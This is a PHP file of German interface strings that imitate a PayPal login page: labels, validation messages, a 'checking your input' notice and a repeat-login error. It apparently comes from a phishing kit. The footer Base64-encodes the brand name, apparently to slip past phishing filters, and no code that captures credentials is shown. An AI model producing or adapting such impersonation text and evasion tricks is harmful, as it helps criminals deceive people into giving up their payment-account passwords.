<?php
$Z118_01 = "Bei PayPal einloggen";
$Z118_02 = "E-Mail-Adresse";
$Z118_03 = "Passwort";
$Z118_04 = "E-Mail-Adresse ist erforderlich.";
$Z118_05 = "Es ist ein Passwort erforderlich.";
$Z118_06 = "Einloggen";
$Z118_07 = "E-Mail-Adresse oder Passwort vergessen?";
$Z118_08 = "Neu anmelden";
$Z118_09 = "Datenschutz";
$Z118_10 = "PayPal";
$Z118_11 = "Copyright © 1999–<script>document.write(new Date().getFullYear());</script> <script>document.write(Base64.decode('UGF5UGFs'));</script>. Alle Rechte vorbehalten.";
$Z118_12 = "Ihre Eingaben werden überprüft…";
$Z118_13 = "Die eingegebenen Login-Daten sind nicht richtig. Bitte versuchen Sie es erneut.";
?>
